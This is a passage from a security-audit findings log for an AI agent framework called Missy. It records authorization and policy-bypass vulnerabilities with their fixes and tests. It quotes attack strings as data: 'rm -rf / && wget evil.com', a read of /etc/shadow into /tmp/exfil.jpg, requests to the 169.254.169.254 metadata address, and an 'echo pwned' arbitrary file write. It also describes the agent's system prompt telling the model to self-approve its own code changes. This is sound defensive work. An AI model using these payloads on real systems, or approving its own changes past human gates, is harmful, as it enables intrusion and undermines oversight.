# AUDIT_SECURITY

## Validation-harness overhaul findings (curated)

Findings from the 2026-07-09/10 validation-harness/security-review
overhaul (`~/missy-loops/prompt.md`, `~/Missy-security-review.md` pinned
at commit `abb7015`). Branch:
`overhaul/missy-validation-20260710-031406`. Tracked by finding ID,
current reachability, and remediation evidence per the prompt's
requirement — do not overwrite, append new entries as work continues.

### SR-1.2 / SR-1.3 — Unauthenticated code-evolution self-approval

- **Status: partially fixed (interim), not fully remediated.**
- **Reachability found:** live and exploitable via two independent
  paths as of commit `eb04006`/`327595b` (this branch, before the fix
  in commit below):
  1. `missy/tools/builtin/code_evolve.py`'s agent-facing `code_evolve`
     tool exposed `approve`/`apply`/`rollback` actions directly to the
     model's tool-calling loop, with no gate. Worse, the default system
     prompt (`missy/agent/runtime.py::AgentConfig.system_prompt`)
     explicitly instructed the model to call
     `code_evolve(action='approve', ...)` then `action='apply'` as
     steps 3-4 of its own "self-evolution workflow" — actively teaching
     self-approval.
  2. `missy/channels/discord/channel.py::_handle_reaction()` let *any*
     Discord user who reacted ✅ on a proposal message trigger
     `CodeEvolutionManager().approve(proposal_id)` directly, with zero
     admin/owner check.
  3. `CodeEvolutionManager.approve()`/`apply()`/`rollback()`
     (`missy/agent/code_evolution.py`) themselves perform **no
     authentication of any kind** — every one of the above paths worked
     because nothing downstream stopped them either.
- **Remediation evidence (commit on this branch, see git log for
  message "FX-E / SR-1.2/1.3: ..."):**
  - `CodeEvolveTool` no longer dispatches `approve`/`apply`/`rollback`;
    those actions are refused unconditionally before
    `CodeEvolutionManager` is constructed. Test:
    `tests/tools/test_code_evolve.py::TestHumanOperatorOnlyActionsRefused`
    and `tests/tools/test_code_evolve_gap_coverage.py::TestHumanOperatorOnlyActionsNeverConstructManager`
    assert the manager class is never called.
  - Default system prompt rewritten: propose-then-stop, plus a general
    "never bypass a gate" instruction.
  - `_handle_reaction()`'s approve branch no longer calls
    `mgr.approve()`; it refuses and emits
    `discord.evolution.approve_denied` (`deny`). Test:
    `tests/channels/test_discord_evolution_reactions.py::TestHandleReaction::test_approve_reaction_is_refused_not_approved`
    and `::test_approve_reaction_emits_deny_audit_event`.
- **Residual risk (not yet fixed):** `CodeEvolutionManager.approve()`/
  `apply()`/`rollback()` still perform zero authentication of their
  own. The only real trust boundary is that `missy evolve
  approve/apply/rollback` (the CLI, `missy/cli/main.py`) requires an
  interactive shell session on the host. There is no "unforgeable,
  proposal-bound, expiring approval artifact" as SR-1.2 asks for, no
  disposable-sandbox validation before promotion (SR-1.3), and no
  authenticated Web API route (none exists yet, so nothing to fix there
  today — but if one is added it must not reuse this trust gap). If any
  future code path constructs `CodeEvolutionManager` directly (bypassing
  the CLI) without its own authentication check, the same class of bug
  reappears. Do not treat this finding as closed.
- **Related finding, checked and fixed this session:** see SR-1.12
  below — the DM-pairing approval flow had the *identical* bug pattern,
  confirmed and fixed in the same session.

### SR-1.8 — Shell default deny

- **Status: fixed.**
- **Reachability found:** live and confirmed by a pre-existing test
  that literally asserted the vulnerable behavior as correct:
  `tests/policy/test_shell.py::TestCompoundCommands::test_empty_allowlist_allows_compound`
  asserted that `engine.check_command("rm -rf / && wget evil.com")`
  returned `True` under `ShellPolicy(enabled=True, allowed_commands=[])`.
  `missy/policy/shell.py::ShellPolicyEngine.check_command()` had an
  explicit code comment: *"Empty allowed_commands means allow-all (shell
  is unrestricted when enabled)."* This directly contradicted
  `ShellPolicy.allowed_commands`'s own docstring in
  `missy/config/settings.py` ("An empty list means no commands are
  allowed even when enabled is True") and the operator-facing docs in
  `docs/configuration.md`/`docs/security.md`/`docs/troubleshooting.md`,
  all three of which already correctly documented the safe (deny-all)
  behavior. The implementation alone had inverted its own documented
  contract — any deployment with `shell.enabled: true` and no
  `allowed_commands` configured (a very easy misconfiguration to reach:
  it's the literal default value of an empty list) got **unrestricted
  host shell access**, not the fail-closed default every other artifact
  promised.
- **Remediation evidence:** `check_command()` now raises
  `PolicyViolationError` when `allowed_commands` is empty, matching the
  documented contract exactly (implementation, docstring, and docs are
  now aligned — none needed to change except the code). Fixed 4
  pre-existing tests that had encoded the vulnerable behavior as
  expected (`tests/policy/test_shell.py` ×2,
  `tests/unit/test_shell_policy_compound_commands.py`,
  `tests/integration/test_end_to_end.py`) to assert the correct
  fail-closed behavior instead, and added a new test in
  `tests/integration/test_end_to_end.py` explicitly covering the
  empty-allowlist-denies case alongside the pre-existing
  explicit-allowlist-permits case. Full suite (20755 tests) green after
  the change with no other hidden dependencies on the old behavior
  found.
- **Residual risk:** none identified for this specific finding — the
  fix is a straightforward, complete alignment of implementation to an
  already-correct documented contract. SR-1.7 (shell side-channel
  closure — command structure beyond `argv[0]`, launcher/delegation
  mechanisms) is separate, related, and not addressed this session.

### SR-1.12 — Authenticated Discord pairing

- **Status: fixed (self-approval and any in-band DM approval closed).**
- **Reachability found:** live and directly exploitable — worse than
  SR-1.2/1.3 in one respect, since it required no prior state at all.
  `missy/channels/discord/channel.py::_check_pairing()` processed
  `!pair accept <target_id>` and `!pair deny <target_id>` DM commands
  with **zero check on who sent them**. Any unpaired stranger could DM
  the bot `!pair` (adding themselves to `_pending_pairs`) immediately
  followed by `!pair accept <their-own-user-id>` and grant themselves
  full DM access — a complete, self-service bypass of the pairing gate
  requiring no authorization step at all. The code comment above the
  block ("admin only — simplified") acknowledged the intended design
  but the "admin only" check was never actually implemented.
- **Remediation evidence:** `_check_pairing()` no longer processes
  `!pair accept`/`!pair deny` from DM content at all — those commands
  are now unconditionally refused with a
  `discord.channel.pairing_decision_denied` (`deny`) audit event
  regardless of sender. `accept_pair()`/`deny_pair()`/
  `get_pending_pairs()` remain as the only way to resolve a pending
  request, and are documented as requiring an authenticated operator
  surface (the Web console/API, which shares the same process as the
  Discord channel under `missy gateway start`) — never DM content. New
  tests:
  `tests/channels/test_discord_channel_coverage.py::TestCheckPairingDeny::test_pair_deny_via_dm_is_refused_not_processed`,
  `tests/channels/discord/test_discord_channel_integration.py::TestCheckPairing::test_accept_command_via_dm_is_refused`,
  `::test_deny_command_via_dm_is_refused`,
  `::test_accept_pair_only_available_via_programmatic_api`,
  `tests/unit/test_discord_channel.py::TestPairingWorkflow::test_accept_via_dm_command_is_refused`.
- **Residual risk:** no authenticated Web API/console endpoint has
  actually been wired to call `accept_pair()`/`deny_pair()` yet, so
  there is currently **no way for an operator to approve a pending
  Discord pairing at all** through any surface — this trades the
  vulnerability for a (safe, but incomplete) loss of functionality.
  Wiring a real authenticated approval endpoint (or a `missy discord
  pairs` CLI command backed by shared persistence, mirroring
  `missy devices pair`'s `DeviceRegistry` pattern) is tracked as
  follow-up work. Rate-limiting of pairing *requests* (`!pair` itself)
  and replay/expiration handling per the full SR-1.12 ask are also not
  yet implemented.

### SR-1.13 — Uniform Discord ingress authorization

- **Status: fixed** for both the message-command ingress path (voice,
  image, screencast) and the slash-command interaction ingress path
  (`/ask`, `/status`, `/model`, `/help`). Reactions (beyond the SR-1.2/
  1.3 and SR-1.12 fixes already covering the two reaction-based flows)
  were not re-audited this pass — see residual risk.
- **Second, more severe finding in the same pass — slash commands had NO
  authorization check at all, not even the pre-fix message-ordering
  bug.** `_handle_interaction()` (`missy/channels/discord/channel.py`,
  the handler for the `INTERACTION_CREATE` Gateway event, a completely
  separate code path from `MESSAGE_CREATE`) dispatched straight to
  `handle_slash_command()` → `_handle_ask()` → `agent.run()` with zero
  call to `_check_dm_policy()`/`_check_guild_policy()` anywhere. Any
  Discord user, in any guild/channel, or in any DM regardless of
  `dm_policy`, could invoke `/ask` and get a full response from the
  agent — completely ignoring `allowed_channels`/`allowed_roles`/
  `allowed_users`/`dm_policy`. **Compounding bug found in the same
  handler:** `missy/channels/discord/commands.py::_handle_ask()`
  hardcoded `session_id="discord"` for every invocation regardless of
  who called it, so every `/ask` interaction from every user across the
  entire bot shared one conversation history — one user's prompts and
  the agent's replies to them became context for every other user's
  `/ask` calls (a privacy/isolation failure independent of the
  authorization gap).
- **Remediation evidence:** `_handle_interaction()` now extracts the
  invoking user's ID (`member.user.id` for guild interactions, `user.id`
  for DM interactions) and runs the same `_check_dm_policy()`/
  `_check_guild_policy()` gate used by regular messages before any
  dispatch, replying with an explicit denial (interaction response type
  4) rather than silently dropping (Discord requires *some* response to
  every interaction). Added `skip_mention_check` to `_check_guild_policy()`
  since `require_mention` is a text-message rule that doesn't apply to
  slash commands (Discord's own command routing already addresses them
  to this bot specifically). `_handle_ask()` now derives `session_id`
  from the same per-user extraction (`_interaction_author_id()`),
  matching the convention already used by the regular message path
  (`msg.metadata.get("discord_author", {}).get("id", "discord")` in
  `missy/cli/main.py`). 6 new tests in
  `tests/channels/test_discord_channel_coverage.py::TestHandleInteractionAuthorizationSR113`
  (guild denied/authorized, require_mention bypass verified, DM
  disabled/unpaired/allowlisted) and 8 new tests in
  `tests/unit/test_discord_commands_coverage.py` covering
  `_interaction_author_id()` extraction and per-user session isolation
  (including a test asserting two different users get two different
  session IDs from consecutive `/ask` calls).
- **Reachability found:** live and directly exploitable, a third
  independent instance of the same "unauthenticated side effect before
  the gate" pattern found twice already this session (SR-1.2/1.3,
  SR-1.12). `missy/channels/discord/channel.py::_handle_message()`
  dispatched voice commands, image commands (`!analyze`/`!screenshot`
  and natural-language equivalents), and screencast commands
  (`!screen ...`) **before** `_check_dm_policy()`/`_check_guild_policy()`
  ran — the code even had an explicit comment reading "handled before
  policy gates." Concretely, this meant:
  - Any message in **any** guild channel — regardless of
    `allowed_channels`, `allowed_roles`, `allowed_users`, or
    `require_mention` — could join a voice channel, capture and analyze
    a screenshot, or start/stop a screen share.
  - Any DM — regardless of `dm_policy` being `DISABLED`, `ALLOWLIST`, or
    `PAIRING` with an unpaired sender — could trigger image and
    screencast commands (voice commands are guild-only by construction).
  - This directly violates the review's stated requirement: "No pre-gate
    command may produce side effects."
- **Remediation evidence:** reordered `_handle_message()` so
  `_check_dm_policy()`/`_check_guild_policy()` now run immediately after
  the own-bot filter and bot-author filter, before any of the three
  special-command dispatchers. Credential/secrets scrubbing intentionally
  still runs first (before authorization) so secrets are scrubbed from
  every channel/DM regardless of policy — that's a strictly more
  protective ordering, not a regression. 11 new tests in
  `tests/channels/test_discord_channel_gap_coverage.py::TestUniformIngressAuthorizationSR113`
  cover: unauthorized guild, authorized guild, channel-not-in-allowlist,
  user-not-in-allowlist, DM policy `DISABLED`, unpaired DM under
  `PAIRING`, and a combined test asserting a single unauthorized message
  reaches none of the three dispatchers. Full `tests/channels/` suite
  (1925 tests) and full repo suite both green after the change.
- **Residual risk:**
  - `allowed_roles` (`DiscordGuildPolicy.allowed_roles`) is a documented,
    parsed config field ("Whitelist of role names that users must hold")
    that is **never actually enforced** in `_check_guild_policy()` — an
    operator configuring it believes interactions are role-gated but
    they are not. Found during this audit, tracked separately (task
    #15) since fixing it requires resolving Discord role IDs from the
    message/interaction payload against role names, a larger change
    than the ordering/gate fixes above.
  - Voice-channel-native commands (`voice_commands.py`, gated separately
    by `DiscordVoiceManager`) were not re-audited for the same pattern
    this session.
  - The Discord pairing reaction/DM flow is fixed (SR-1.12) and the
    evolution-approval reaction flow is fixed (SR-1.2/1.3), but no other
    `MESSAGE_REACTION_ADD` handling was re-verified for the same "side
    effect before gate" pattern.
  - Attachment gates (explicitly named in SR-1.13's text) were reviewed
    as part of the `_handle_message()` reordering and confirmed to
    already run after the credential-scrub step and are themselves
    unaffected by the voice/image/screencast reordering, but were not
    independently re-audited for authorization-bypass potential beyond
    that.

### SR-1.5 — Incus tools' declaration/dispatch mismatch bypasses shell + filesystem policy

- **Status: fixed** for the specific mismatches the review identified
  (`incus_exec` checking the guest command instead of the host binary;
  every other Incus tool's shell permission being checked against a
  meaningless dummy string; `incus_file`'s `host_path` never being
  checked against the filesystem policy at all). The underlying
  architectural gap the review calls out in "The architectural finding"
  (`registry.py`'s permission check is a parameter-name heuristic that
  first-party tools can silently slip past) is addressed generally, not
  just patched per-tool — see remediation evidence.
- **Reachability found:** live and directly exploitable, demonstrated
  against the real `ToolRegistry` + `PolicyEngine` stack (not just
  unit-level mocks):
  1. Every Incus tool declared `ToolPermissions(shell=True)` with no
     `command` kwarg (except `incus_exec`), so
     `registry._check_permissions()` derived the checked command from
     `kwargs.get("command", "shell")` — the literal string `"shell"`.
     Reproduced: with `ShellPolicy(enabled=True, allowed_commands=["git"])`,
     `incus_instance_action(action="delete", ...)` was policy-checked
     against `"shell"`, not `"incus"` — the registry was trusting tool
     metadata (`shell=True`) that didn't match the actual operation
     performed (`subprocess.run(["incus", ...])`), exactly as the review
     states. (Whether this was independently exploitable as an
     *allow-all* depended on the SR-1.8 empty-allowlist bug fixed
     earlier this session — before that fix, an operator's empty
     `allowed_commands` list, believing it meant deny-all, let every
     Incus tool run unconditionally via this same dummy-string path.
     SR-1.8 alone closed that specific combination; SR-1.5 closes the
     mismatch itself, which has an independently exploitable instance
     below.)
  2. **`incus_exec` checked the wrong target entirely — not merely a
     dummy string.** Its `command` kwarg names the command run *inside
     the guest instance*, but the policy check used that same kwarg to
     gate the *host* operation. Reproduced end-to-end: with
     `ShellPolicy(enabled=True, allowed_commands=["bash"])` — an
     operator's plausible intent being "the agent may run bash scripts
     inside sandboxed guests only" — calling
     `incus_exec(instance="victim-container", command="bash")` **passed
     policy** (only a launcher-command warning was logged) and the real
     host subprocess `["incus", "exec", "victim-container", "--", "bash",
     "-c", "bash"]` executed. The host `incus` binary was invoked despite
     never being in `allowed_commands` at all — a full policy bypass, not
     merely a permissive default.
  3. `incus_file` declared `shell=True` only; `filesystem_read`/
     `filesystem_write` were never declared, so its `host_path` kwarg
     (arbitrary host read for `push`, arbitrary host write for `pull`)
     was never checked against `FilesystemPolicy.allowed_read_paths`/
     `allowed_write_paths` at all, regardless of configuration.
- **Remediation evidence:** added two optional hook methods to
  `BaseTool` (`missy/tools/base.py`) —
  `resolve_shell_command(kwargs) -> str | list[str] | None` and
  `resolve_filesystem_targets(kwargs) -> tuple[list[str], list[str]]` —
  that let a tool declare the *real* host command/paths an invocation
  will touch instead of relying on the registry's generic kwarg-name
  heuristic. `ToolRegistry._check_permissions()`
  (`missy/tools/registry.py`) now checks whether a tool overrides either
  hook (`type(tool).resolve_x is not BaseTool.resolve_x`) and, if so,
  uses the resolved value exclusively — including failing closed (an
  unresolvable dummy target that matches no real allowlist entry) when
  the resolver returns `None` for a given call, rather than silently
  trusting an arbitrary kwarg. Tools that don't override either hook get
  byte-for-byte the same behavior as before (verified: full `tests/`
  suite green with zero changes needed to any tool other than the ones
  migrated below). `missy/tools/builtin/incus_tools.py`: added
  `_IncusHostCommandMixin.resolve_shell_command()` returning the literal
  `"incus"` (the one true host binary every Incus tool invokes via
  `_run_incus()`), applied to all 15 Incus tool classes; `IncusFileTool`
  now declares `filesystem_read=True, filesystem_write=True` and
  overrides `resolve_filesystem_targets()` to check `host_path` as a
  read for `push`, a write for `pull`, or both for an unrecognized
  action (fail-safe — `execute()` rejects invalid actions on its own
  regardless). Live-verified against the real registry+policy+subprocess
  stack, before and after, for both the `incus_exec` guest/host
  confusion and the `incus_file` unchecked-path cases (results included
  in the session commit message). New tests:
  `tests/tools/test_registry_hardening.py::TestPermissionChecking` gained
  4 new cases proving the generic hooks are honored, ignored-by-default
  for non-overriding tools, and fail closed on `None`; new classes
  `TestSR15ShellPolicyGatesRealHostCommand` (5 tests, including the
  `incus_exec` host-vs-guest reproduction) and
  `TestSR15IncusFileFilesystemEnforcement` (6 tests) in
  `tests/tools/test_incus_tools.py` (15 new tests total this
  checkpoint).
- **Residual risk:** the registry-level hook mechanism is now available
  but has only been adopted by Incus tools this session. SR-1.4 (the
  same `vision_capture`/`incus_file`-style parameter-name heuristic gap
  in tools beyond Incus) and SR-1.6 (Playwright browser navigation
  bypassing `PolicyHTTPClient`/the network gateway entirely — a
  different, non-shell mechanism, not addressed by this fix) remain
  open; `vision_capture`'s `source`/`save_path` kwargs still go
  unchecked by the filesystem policy engine via the legacy heuristic
  path. The shell allow-list itself is still program-name-only (SR-1.7,
  separate finding, not addressed here) — allowlisting `"incus"` grants
  every Incus subcommand uniformly, matching the existing granularity of
  every other shell-gated tool in this codebase, not a regression
  specific to this fix.

### SR-1.6 — Playwright browser navigation bypassed the network policy gateway entirely

- **Status: fixed.** This was flagged as a crown-jewel bypass: for a
  product whose stated value proposition is "no outbound traffic unless
  explicitly allowlisted," `BrowserNavigateTool` navigated with zero
  policy enforcement of any kind.
- **Reachability found:** live and directly exploitable, confirmed
  against the real registry+policy stack (not just mocks). `web_fetch`
  and Discord upload both route every request through
  `PolicyHTTPClient`, which enforces the network policy internally per
  request; `browser_tools.py` was the sole exception — it called
  Playwright's `page.goto(url)` directly. Two independent gaps
  compounded:
  1. `ToolPermissions(network=True)` was declared with an empty static
     `allowed_hosts`, and (before this session's SR-1.5 work added the
     `resolve_*` hook mechanism) the registry had **no dynamic
     kwarg-based check for network targets at all** — unlike filesystem/
     shell, which at least had a generic-name heuristic. So the registry
     performed literally zero host checks for this tool regardless of
     configuration.
  2. Even if the registry had checked something, `page.goto()` itself
     never consulted the policy engine, `PolicyHTTPClient`, or any
     equivalent — Playwright drove the HTTP request directly.
  Live-reproduced: with `NetworkPolicy()` (nothing allowlisted),
  `browser_navigate(url="http://169.254.169.254/latest/meta-data/")` —
  the AWS/GCP/Azure instance-metadata SSRF target explicitly named by
  the review — **passed the registry's permission check** and proceeded
  straight to Playwright with no denial of any kind (it then failed only
  because this dev sandbox has no `playwright` package installed, an
  unrelated pre-existing environment limitation). The review additionally
  notes that "every subresource/redirect/fetch inside Firefox is outside
  the Python gateway too" — i.e. even a naive fix that only checked the
  top-level `page.goto()` URL would still leave every redirect,
  subresource, and JS-triggered `fetch()`/XHR (reachable via the
  `browser_evaluate` tool) completely unchecked.
- **Remediation evidence — two layers, addressing both the initial
  navigation and everything after it:**
  1. **Registry-level pre-check:** `BrowserNavigateTool` now overrides
     the `resolve_network_hosts()` hook added by this session's SR-1.5
     fix, extracting the target hostname from the `url` kwarg via
     `urllib.parse.urlparse`. The registry (`missy/tools/registry.py`)
     now calls `engine.check_network()` on every resolved host for any
     tool that overrides this hook, in addition to the (still-empty)
     static `allowed_hosts` list. This gives a clean, immediate
     `PolicyViolationError`-backed denial before Playwright is ever
     touched — verified live: the cloud-metadata URL above is now
     denied with `"Network access denied: '169.254.169.254' is not in
     an allowed CIDR block"`, and a matching request to an explicitly
     allowlisted domain passes the policy check cleanly (fails only on
     the pre-existing missing-playwright environment limitation, proving
     the policy layer itself is not what's blocking it).
  2. **Playwright-level request interception (defense in depth for
     everything the registry can't see ahead of time):**
     `BrowserSession._start()` now registers
     `context.route("**/*", _route_through_network_policy)` on every
     browser context. This handler runs on **every** request the
     context makes — main-frame navigation, redirects, subresources,
     and JS-triggered `fetch()`/XHR calls issued via `browser_evaluate`
     — extracts the hostname, and calls `engine.check_network()` before
     allowing the request to proceed (`route.continue_()`); any
     exception (denial, policy engine not initialised, malformed URL,
     disallowed scheme) results in `route.abort("blockedbyclient")`,
     failing closed. `data:`/`blob:`/`about:`/`chrome:`/extension
     schemes (no real network destination, required for normal page
     rendering) are always allowed through unchecked; `file://` and any
     unrecognized scheme are always blocked — `file://` grants arbitrary
     local filesystem access via the browser, a materially different and
     unneeded capability no browser tool declares or asks for.
     `_classify_browser_error()` gained a marker recognizing
     Playwright's abort-reason error text so a route-level policy denial
     surfaces as a clear, actionable message rather than a generic
     network error.
  New tests: `TestBrowserNavigateResolveNetworkHosts` (3),
  `TestSR16RegistryGatesBrowserNavigate` (3, including the live
  cloud-metadata denial reproduction),
  `TestRouteThroughNetworkPolicy` (10, covering denial, allow, fail-closed
  on uninitialised policy engine, fail-closed on `PolicyViolationError`,
  always-allowed pseudo-schemes, `file://` blocking regardless of
  network config, unrecognized-scheme fail-closed, and no-host
  fail-closed), plus one test confirming `_start()` wires up the route
  handler and one confirming the new error-classification marker — 18
  new tests total in `tests/tools/test_browser_tools_gaps.py`.
- **Residual risk:** this closes the Python-level and same-context
  bypasses the review's evidence demonstrates, but is not a complete
  browser sandbox. Not addressed: (a) DNS-rebinding-style TOCTOU between
  this check and Firefox's own connection (same class of gap as SR-1.9,
  not specific to browser tools); (b) any Playwright/Firefox
  capability that establishes a connection through a mechanism other
  than the standard request pipeline `context.route()` intercepts (e.g.
  WebRTC ICE candidate gathering, which can leak local/LAN IPs via a
  path this interception does not cover — a known general limitation of
  browser-level network policy enforcement, not unique to this
  implementation); (c) `browser_evaluate`'s arbitrary JS execution can
  still read/exfiltrate data via any request that *does* pass the host
  check (e.g. to an allowlisted domain) — host-level allowlisting was
  the review's explicit ask and is what's fixed, not a general
  same-origin/CSP-style content policy. SR-1.7 (shell allow-list
  granularity) and SR-1.9 (network TOCTOU) remain separate, open
  findings.

### SR-1.4 — Permission enforcement is a parameter-name heuristic (vision tools instance)

- **Status: fixed** for `vision_capture`/`vision_burst`, the two tools
  the review names explicitly. This is the same architectural gap as
  SR-1.5 (Incus), fixed by reusing the `resolve_filesystem_targets()`
  hook that session work added — no new mechanism was needed.
- **Reachability found:** live and confirmed against the real
  registry+policy stack. `VisionCaptureTool` declared
  `ToolPermissions(filesystem_read=True, filesystem_write=True)` but
  reads its target from a `source` kwarg and writes to a `save_path`
  kwarg (also reads a `device` kwarg for camera hardware paths) — none
  of these match the registry's generic `path`/`file_path`/`target`/
  `destination` heuristic, so the declared permissions enforced
  **nothing** regardless of `FilesystemPolicy` configuration.
  Live-reproduced: with nothing filesystem-allowlisted,
  `vision_capture(source="/etc/shadow", save_path="/tmp/exfil.jpg")`
  **passed the registry's permission check** with zero denial and the
  tool proceeded to actually call `cv2.imread("/etc/shadow")` — it only
  failed because `/etc/shadow` isn't a valid image format, not because
  of any policy gate. A source pointed at a real image file the operator
  never intended to expose (or any other content OpenCV can decode, not
  limited to conventional image formats) would have succeeded reading
  it, and any `save_path` would have succeeded writing to it, with the
  filesystem allowlist providing zero protection either direction.
- **Remediation evidence:** `VisionCaptureTool.resolve_filesystem_targets()`
  now returns `source` as a read target unless it's one of the
  non-path sentinel values (`"webcam"`, `"camera"`, `"screenshot"`),
  `device` as an additional read target when present, and `save_path` as
  the write target — falling back to the same fixed
  `~/.missy/captures/` default `execute()` itself uses when `save_path`
  is omitted, so the check reflects the real write location even when
  the model doesn't pass one explicitly. `VisionBurstCaptureTool`
  likewise resolves `device` as a read target and, since its
  `best_only=False` branch never writes to disk at all (confirmed by
  reading `execute()`), only declares a write target
  (`~/.missy/captures/`) when `best_only=True` — matching actual
  behavior exactly rather than over- or under-checking. Live-verified
  the fix denies the `/etc/shadow` reproduction above with a clean
  `PolicyViolationError` (`"Filesystem read denied"`), and that a
  matching request with both paths allowlisted passes the policy layer
  cleanly. 14 new tests in `tests/vision/test_vision_tools.py`
  (`TestVisionCaptureResolveFilesystemTargets`,
  `TestSR14RegistryGatesVisionCapture`,
  `TestVisionBurstResolveFilesystemTargets`).
- **Residual risk:** `VisionDevicesTool` also declares
  `filesystem_read=True` but was left unchanged — it takes no kwargs at
  all and only enumerates a fixed, non-attacker-controlled sysfs path
  set (`CameraDiscovery`), so there is no dynamic target for a resolver
  to check; this isn't the same bug. The review's finding also names
  `incus_file` (fixed under SR-1.5) as an example of this pattern; no
  further tools were audited for the same parameter-name mismatch this
  session — a full sweep of every `ToolPermissions(filesystem_*=True)`
  or `network=True` declaration across `missy/tools/builtin/` against
  its tool's actual kwargs has not been performed, so other
  not-yet-found instances of this pattern may remain.

### SR-1.9a — Network policy: allowlisted hosts/domains skipped DNS-rebinding IP verification

- **Status: fixed** for the deterministic sub-finding (a) — an
  allowlisted hostname's resolved IP was never checked. Sub-finding (b)
  (TOCTOU between policy-check-time and connect-time DNS resolution,
  which requires attacker control of DNS with a low TTL) is a distinct,
  substantially harder problem and remains open — see residual risk.
- **Reachability found:** live and confirmed against the real
  `NetworkPolicyEngine`, and previously encoded as *intentional,
  tested* behavior. `check_host()`'s exact-hostname match (step 3,
  `allowed_hosts`) and domain-suffix match (step 4, `allowed_domains`)
  both returned `allow` immediately with **zero IP verification** — the
  DNS-rebinding defense (deny if a resolved address is private/loopback/
  link-local and not separately covered by `allowed_cidrs`) only ran on
  the step-5 fallback path, for hostnames that matched *neither*
  `allowed_hosts` nor `allowed_domains`. Two pre-existing tests in
  `tests/policy/test_network_edges.py::TestShortCircuitBehaviour`
  (`test_exact_host_match_does_not_call_dns`,
  `test_domain_match_does_not_call_dns`) explicitly asserted this as
  correct, mirroring the SR-1.8 pattern of a vulnerable behavior encoded
  as a passing test. Live-reproduced: with `allowed_hosts=
  ["build.corp.example.com"]` and a fake resolver configured to raise
  `AssertionError` if ever called, `check_host("build.corp.example.com")`
  **returned `True` without the resolver ever being invoked** — proving
  the review's concrete scenario (an allowlisted hostname whose DNS
  record now points at `10.0.0.5`, or any other internal/reserved
  address) would connect with no verification of any kind, unlike every
  other host in the system.
- **Remediation evidence:** extracted the existing step-5
  rebinding-check logic into a shared `_resolve_and_check_rebinding()`
  helper and applied it uniformly to steps 3 and 4 as well — a matched
  hostname now still has its resolved IP(s) checked before the request
  is allowed, exactly the same protection step 5 already gave
  non-matched hostnames. A hostname that fails to resolve at all
  (`OSError`) is still allowed (there is nothing to "rebind" if the name
  has no live DNS record — this preserves prior behavior for names with
  no DNS record, matching how most test fixtures and disposable/internal
  hostnames behave) — the previous "match by name" result is untouched
  in that case. Live-verified: the exact reproduction above now raises a
  `PolicyViolationError` mentioning "rebinding". 6 new/rewritten tests in
  `tests/policy/test_network_edges.py::TestShortCircuitBehaviour`.
  **Test-suite performance regression found and fixed in the same
  checkpoint:** six Hypothesis property tests in
  `tests/policy/test_policy_property.py` (`TestNetworkDomainMatching`,
  `TestNetworkAllowedHosts`) generate random hostnames as `allowed_hosts`/
  `allowed_domains` entries and assert the match is allowed, without
  mocking DNS — previously fine since matched hosts never called DNS,
  but after this fix each of up to 100 Hypothesis examples per test
  performed a real, unmocked `socket.getaddrinfo()` call for a
  nonexistent hostname, taking `tests/policy/`+`tests/gateway/`+
  `tests/security/` from ~76s to ~380s. Fixed by mocking
  `socket.getaddrinfo` to raise `OSError` in those six tests, exactly
  matching the pattern this same file already used correctly for its
  deny-path tests — runtime returned to ~69s (in line with the ~76s
  baseline) with the same 3040 tests passing.
- **Residual risk:** sub-finding (b), the TOCTOU between this
  policy-check-time resolution and the actual connect-time resolution
  `httpx`/Playwright perform independently, is **not** addressed — an
  attacker who controls DNS for an allowlisted domain with a very low
  TTL could still serve a public IP to the policy check and a private
  one to the real connection a moment later. Closing that requires
  connecting to a pinned, policy-verified IP rather than re-resolving
  the hostname at connect time (a materially larger change touching the
  gateway client and/or the OS-level connection APIs), and is out of
  scope for this checkpoint. This finding also does not address
  `browser_tools.py`'s own request path (`_route_through_network_policy`,
  fixed under SR-1.6) needing a parallel fix, since it already calls the
  same `NetworkPolicyEngine.check_network()`/`check_host()` and
  therefore inherits this fix automatically — verified by inspection,
  not by adding a redundant browser-specific test.

### SR-1.7 — Shell policy: redirection targets bypassed the filesystem policy entirely

- **Status: fixed** for the redirection-target sub-finding. The
  launcher-command sub-finding (`env`/`find`/`xargs`/`bash`/`sudo` etc.
  being "warned, not blocked") is a distinct product-policy question —
  see residual risk — and is intentionally not changed here.
- **Reachability found:** live and directly exploitable through the
  real, unmocked production `shell_exec` tool — not a theoretical gap.
  `ShellPolicyEngine.check_command()` only ever validated program
  names; redirection operators (`>`, `>>`, `<`, etc.) were never parsed
  or routed through `FilesystemPolicyEngine` at all, and
  `shell_exec.py::_execute_direct()` runs every command via
  `subprocess.run(command, shell=True, executable="/bin/bash")` — a
  real shell that genuinely interprets redirection syntax.
  End-to-end reproduction against the live `ToolRegistry` +
  `shell_exec` tool, with only `"echo"` in `allowed_commands` and
  `allowed_write_paths` completely empty: `shell_exec(command="echo
  pwned > /tmp/.../not_allowed/pwn.txt")` returned `success: True`,
  and **the file was genuinely created on disk** with content
  `"pwned"` — an unrestricted arbitrary-file-write primitive available
  through any tool config that permits even a single, entirely
  innocuous-seeming command like `echo`.
- **Remediation evidence:** added
  `ShellPolicyEngine.extract_redirect_targets()`
  (`missy/policy/shell.py`), which tokenises a command with
  POSIX-punctuation-aware `shlex` (`punctuation_chars=True`) so
  redirect operators are recognised whether or not surrounded by
  whitespace (`echo x>file` is caught exactly like `echo x > file`,
  closing an obvious naive-scanner dodge) and returns every write
  (`>`, `>>`, `>|`, `&>`, `&>>`) and read (`<`, `<>`) target across all
  sub-commands of a compound chain, while correctly excluding
  file-descriptor-duplication forms (`2>&1`, `>&2`) which name an fd
  number, not a path. `PolicyEngine.check_shell()`
  (`missy/policy/engine.py`) — the facade with access to both the
  shell and filesystem engines — now calls this after the program-name
  check passes and routes every target through
  `filesystem.check_write()`/`check_read()`. Live-verified the exact
  reproduction above is now denied
  (`"Filesystem write denied: ... is not within an allowed write
  path"`) and the target file is never created; a matching request
  with the write path allowlisted passes cleanly. 18 new tests in
  `tests/policy/test_shell.py::TestExtractRedirectTargets` and 7 new
  in `tests/policy/test_engine.py::TestCheckShellRedirectionTargets`.
- **Bug found and fixed in the same checkpoint (not itself a security
  finding, but directly in the code this fix touches):**
  `_extract_all_programs()`'s chain-operator splitting regex treated a
  bare `&` as the background-execution operator even when it was part
  of a file-descriptor-duplication redirect (`2>&1`, `>&2`, `<&0`),
  splitting `"echo hi 2>&1"` into fake sub-commands `"echo hi 2>"` and
  `"1"` and denying the extremely common `2>&1` idiom outright (`"'1'
  is not in the allowed commands list"`) even when `echo` was
  correctly allowlisted. Confirmed pre-existing via `git stash`. Fixed
  with a negative lookbehind excluding `&` immediately preceded by `<`
  or `>`; genuine background-execution `&` (not part of a redirect)
  still splits correctly. 5 new tests in
